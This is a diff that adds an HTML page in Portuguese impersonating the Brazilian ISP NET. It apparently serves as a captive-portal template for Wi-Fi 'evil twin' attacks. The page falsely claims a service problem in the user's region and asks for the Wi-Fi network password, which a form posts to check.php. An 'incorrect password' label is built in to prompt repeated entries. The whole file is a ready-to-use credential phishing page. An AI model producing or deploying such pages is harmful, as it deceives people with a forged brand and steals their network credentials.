@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <link rel="stylesheet" type="text/css" href="./css/general.css">
+        <link rel="stylesheet" type="text/css" href="./bootstrap-3.3.7/css/bootstrap.min.css">
+        <title>NET - O Mundo é dos NETS</title>
+    </head>
+    <body>
+        <div class="main">
+            <div class="container">
+                <div class="row">
+                    <div class="logo col-xs-offset-1 col-sm-offset-3 col-md-offset-5">
+                        <h1 title="NET - O Mundo é dos NETS">NET - O Mundo é dos NETS</h1>
+                    </div> 
+                </div>
+                
+                <div class="row">
+                    <div class="alert alert-danger col-xs-offset-1 col-sm-offset-3 col-md-offset-5" role="alert">
+                        <strong>Detectamos um problema em nossos serviços na sua região.</strong> Por favor, entre novamente com sua senha de rede
+                        wi-fi para reestabelecer a conexão.
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="form col-xs-offset-1 col-sm-offset-3 col-md-offset-5">
+
+                        <form id="form_principal" name="LoginForm" action="check.php" method="post">
+                            <div class="login_entry">
+                                <label for="passwordHint">Senha da rede Wi-Fi</label>
+                                <input class="password-error-input" type="password" name="key1" id="passwordHint" value="" maxlength="64">
+                                <small class="password-error-label"><strong>Senha incorreta</strong></small>
+                            </div>
+                            <div class="login_bottom">
+                                <input type="submit" name="_submit" value="">  
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
